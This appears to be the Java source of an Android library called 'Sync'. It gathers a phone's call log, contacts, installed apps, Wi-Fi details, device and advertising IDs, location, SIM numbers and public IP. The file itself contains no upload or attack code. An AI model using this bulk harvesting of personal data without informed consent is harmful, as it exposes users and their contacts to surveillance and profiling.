package com.sync.library;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

import androidx.core.content.ContextCompat;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.ads.identifier.AdvertisingIdClient.Info;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.Task;
import com.sync.library.models.CallLog;
import com.sync.library.models.Contact;
import com.sync.library.models.DeviceID;
import com.sync.library.models.DeviceModel;
import com.sync.library.models.Gaid;
import com.sync.library.models.InstalledApp;
import com.sync.library.models.InstallLocation;
import com.sync.library.models.LocationInfo;
import com.sync.library.models.MobileNumber;
import com.sync.library.models.PublicIP;
import com.sync.library.models.WifiInfo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;

public class Sync {

    public interface GaidCallback {
        void onResult(Gaid gaid);
        void onError(Exception e);
    }

    public interface PublicIPCallback {
        void onResult(List<PublicIP> ipList);
        void onError(Exception e);
    }

    public interface LocationCallback {
        void onResult(LocationInfo location);
        void onError(Exception e);
    }

    public interface InstallLocationCallback {
        void onResult(InstallLocation installLocation);
        void onError(Exception e);
    }

    public static List<CallLog> getCallLogs(Context context) {
        List<CallLog> callLogs = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            return callLogs;
        }
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC"
        );
        if (cursor != null) {
            int nameIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME);
            int numIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER);
            int durIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION);
            int dateIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DATE);
            int typeIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE);
            while (cursor.moveToNext()) {
                String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                String number = numIdx >= 0 ? cursor.getString(numIdx) : null;
                long duration = durIdx >= 0 ? cursor.getLong(durIdx) : 0;
                long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                String callType = typeToString(type);
                callLogs.add(new CallLog(
                        name != null ? name : "Unknown",
                        number != null ? number : "",
                        duration, date, callType
                ));
            }
            cursor.close();
        }
        return callLogs;
    }

    private static String typeToString(int type) {
        switch (type) {
            case android.provider.CallLog.Calls.INCOMING_TYPE: return "INCOMING";
            case android.provider.CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
            case android.provider.CallLog.Calls.MISSED_TYPE:   return "MISSED";
            default: return "UNKNOWN";
        }
    }

    public static List<Contact> getContacts(Context context) {
        List<Contact> contacts = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            return contacts;
        }
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        );
        if (cursor != null) {
            int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            while (cursor.moveToNext()) {
                String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                String number = numIdx >= 0 ? cursor.getString(numIdx) : null;
                contacts.add(new Contact(
                        name != null ? name : "Unknown",
                        number != null ? number : ""
                ));
            }
            cursor.close();
        }
        return contacts;
    }

    public static List<InstalledApp> getInstalledApps(Context context) {
        List<InstalledApp> apps = new ArrayList<>();
        PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> appInfos = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo appInfo : appInfos) {
            try {
                PackageInfo pkgInfo = pm.getPackageInfo(appInfo.packageName, 0);
                String appName = pm.getApplicationLabel(appInfo).toString();
                String version = pkgInfo.versionName != null ? pkgInfo.versionName : "Unknown";
                apps.add(new InstalledApp(appName, version, appInfo.packageName));
            } catch (PackageManager.NameNotFoundException e) {
                apps.add(new InstalledApp(
                        appInfo.packageName, "Unknown", appInfo.packageName
                ));
            }
        }
        return apps;
    }

    public static WifiInfo getWifi(Context context) {
        WifiManager wifiManager = (WifiManager) context.getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
        if (wifiManager != null) {
            android.net.wifi.WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            if (wifiInfo != null) {
                String bssid = wifiInfo.getBSSID() != null ? wifiInfo.getBSSID() : "";
                String ssid = wifiInfo.getSSID() != null ? wifiInfo.getSSID() : "";
                return new WifiInfo(bssid, ssid);
            }
        }
        return new WifiInfo("", "");
    }

    public static DeviceID getDeviceID(Context context) {
        @SuppressLint("HardwareIds")
        String id = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ANDROID_ID
        );
        return new DeviceID(id != null ? id : "");
    }

    public static void getGaid(Context context, GaidCallback callback) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
                String id = adInfo != null ? adInfo.getId() : "";
                callback.onResult(new Gaid(id));
            } catch (Exception e) {
                callback.onError(e);
            }
        });
    }

    public static DeviceModel makeModel() {
        String brand = Build.BRAND != null ? Build.BRAND : "";
        String manufacturer = Build.MANUFACTURER != null ? Build.MANUFACTURER : "";
        String version = Build.VERSION.RELEASE != null ? Build.VERSION.RELEASE : "";
        return new DeviceModel(brand, manufacturer, version);
    }

    public static void getLocation(Context context, LocationCallback callback) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            callback.onError(new SecurityException("Location permission not granted"));
            return;
        }
        FusedLocationProviderClient fusedClient =
                LocationServices.getFusedLocationProviderClient(context);
        @SuppressLint("MissingPermission")
        Task<Location> task = fusedClient.getLastLocation();
        task.addOnSuccessListener(location -> {
            if (location != null) {
                callback.onResult(new LocationInfo(
                        location.getLatitude(),
                        location.getLongitude(),
                        location.getTime()
                ));
            } else {
                callback.onError(new Exception("Location is null"));
            }
        });
        task.addOnFailureListener(callback::onError);
    }

    public static void getInstallLocation(Context context, InstallLocationCallback callback) {
        getLocation(context, new LocationCallback() {
            @Override
            public void onResult(LocationInfo location) {
                callback.onResult(new InstallLocation(
                        location.getLat(), location.getLng(), location.getTime()
                ));
            }
            @Override
            public void onError(Exception e) {
                callback.onError(e);
            }
        });
    }

    public static void getPublicIPList(PublicIPCallback callback) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                List<PublicIP> ips = new ArrayList<>();
                String ip = getPublicIPFromService("https://api.ipify.org");
                if (ip != null) ips.add(new PublicIP(ip));
                if (ips.isEmpty()) {
                    ip = getPublicIPFromService("https://checkip.amazonaws.com");
                    if (ip != null) ips.add(new PublicIP(ip));
                }
                callback.onResult(ips);
            } catch (Exception e) {
                callback.onError(e);
            }
        });
    }

    private static String getPublicIPFromService(String serviceUrl) {
        try {
            URL url = new URL(serviceUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(conn.getInputStream())
            );
            String ip = reader.readLine();
            reader.close();
            return ip != null ? ip.trim() : null;
        } catch (IOException e) {
            return null;
        }
    }

    public static List<MobileNumber> getMobileNumber(Context context) {
        List<MobileNumber> numbers = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            return numbers;
        }
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm == null) return numbers;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                List<SubscriptionInfo> subs = null;
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS)
                        == PackageManager.PERMISSION_GRANTED) {
                    SubscriptionManager sm = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                    if (sm != null) {
                        subs = sm.getActiveSubscriptionInfoList();
                    }
                }
                if (subs != null && !subs.isEmpty()) {
                    for (SubscriptionInfo sub : subs) {
                        String simSlot = "SIM" + (sub.getSimSlotIndex() + 1);
                        String number = sub.getNumber() != null ? sub.getNumber() : "";
                        numbers.add(new MobileNumber(simSlot, number));
                    }
                } else {
                    String number = tm.getLine1Number();
                    numbers.add(new MobileNumber("SIM1", number != null ? number : ""));
                }
            } catch (Exception e) {
                String number = tm.getLine1Number();
                numbers.add(new MobileNumber("SIM1", number != null ? number : ""));
            }
        } else {
            String number = tm.getLine1Number();
            numbers.add(new MobileNumber("SIM1", number != null ? number : ""));
        }
        return numbers;
    }
}
